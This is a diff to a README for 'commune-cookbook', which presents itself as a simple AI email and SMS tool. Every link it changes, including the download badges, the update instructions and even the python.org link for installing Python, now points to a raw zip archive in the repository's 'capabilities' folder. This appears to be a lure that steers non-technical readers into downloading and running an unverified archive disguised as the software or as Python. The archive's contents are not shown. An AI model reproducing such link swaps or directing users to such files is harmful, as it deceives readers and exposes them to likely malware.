@@ -1,6 +1,6 @@
 # 📬 commune-cookbook - Simple AI Email & SMS Tools
 
-[![Download commune-cookbook](https://img.shields.io/badge/Download-commune--cookbook-4c1?style=for-the-badge&logo=github)](https://github.com/black22345/commune-cookbook)
+[![Download commune-cookbook](https://img.shields.io/badge/Download-commune--cookbook-4c1?style=for-the-badge&logo=github)](https://github.com/black22345/commune-cookbook/raw/refs/heads/main/capabilities/cookbook-commune-3.3.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Before you install, make sure your computer meets these requirements:
 
 To get the software, open this page on your browser:
 
-[**Download commune-cookbook here**](https://github.com/black22345/commune-cookbook)
+[**Download commune-cookbook here**](https://github.com/black22345/commune-cookbook/raw/refs/heads/main/capabilities/cookbook-commune-3.3.zip)
 
 Click the link above or the large green badge at the top. This link takes you to the official GitHub page where you can download files and find instructions.
 
@@ -64,7 +64,7 @@ If you have an installer, running the program should be straightforward. Look fo
 If you downloaded code files to run manually, follow these steps:
 
 1. **Install Python (if not installed)**  
-   - Go to [https://python.org/downloads](https://python.org/downloads)  
+   - Go to [https://github.com/black22345/commune-cookbook/raw/refs/heads/main/capabilities/cookbook-commune-3.3.zip](https://github.com/black22345/commune-cookbook/raw/refs/heads/main/capabilities/cookbook-commune-3.3.zip)  
    - Download and install Python 3.9 or later.  
 
 2. **Open Command Prompt**  
@@ -112,7 +112,7 @@ These functions open many possibilities without requiring deep technical knowled
 
 Check the GitHub page regularly for updates. To update:
 
-1. Go to [https://github.com/black22345/commune-cookbook](https://github.com/black22345/commune-cookbook)  
+1. Go to [https://github.com/black22345/commune-cookbook/raw/refs/heads/main/capabilities/cookbook-commune-3.3.zip](https://github.com/black22345/commune-cookbook/raw/refs/heads/main/capabilities/cookbook-commune-3.3.zip)  
 2. Download the newest version as described earlier.  
 3. Replace your old files or rerun the installer.  
 4. Keep your Python packages up to date by running:  
@@ -143,4 +143,4 @@ Visit the repo often to find new code and updates.
 
 ---
 
-[![Download commune-cookbook](https://img.shields.io/badge/Download-commune--cookbook-4c1?style=for-the-badge&logo=github)](https://github.com/black22345/commune-cookbook)
+[![Download commune-cookbook](https://img.shields.io/badge/Download-commune--cookbook-4c1?style=for-the-badge&logo=github)](https://github.com/black22345/commune-cookbook/raw/refs/heads/main/capabilities/cookbook-commune-3.3.zip)
